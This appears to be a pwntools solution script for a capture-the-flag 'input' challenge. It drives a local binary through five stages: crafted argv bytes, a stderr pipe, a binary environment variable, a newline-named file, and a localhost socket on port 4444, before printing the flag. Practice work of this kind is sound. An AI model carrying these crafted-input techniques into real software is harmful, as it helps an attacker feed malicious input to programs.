from pwn import *
import os
import socket

# Stage 1: argv manipulation
args = ['A'] * 100
args[65] = '\x00'
args[66] = '\x20\x0a\x0d'
args[67] = '4444'  # Port for Stage 5

# Stage 2: stdio manipulation
stderr_r, stderr_w = os.pipe()
os.write(stderr_w, b'\x00\x0a\x02\xff')
os.close(stderr_w)

# Stage 3: Environment variable manipulation
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}

# Stage 4: File manipulation
with open(b'\x0a', 'w') as file:
    file.write("\x00\x00\x00\x00")

# Stage 5: Network socket manipulation
def get_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('localhost', 4444))
        s.sendall(b'\xde\xad\xbe\xef')
        print("Data sent!")

# Run the program
p = process(executable='./code', argv=args, stderr=stderr_r, env=env)

# Provide stdin input for Stage 2
p.stdin.write(b'\x00\x0a\x00\xff')
p.stdin.flush()

# Trigger Stage 5
get_payload()

# Print the flag
print(p.recv())
p.close()
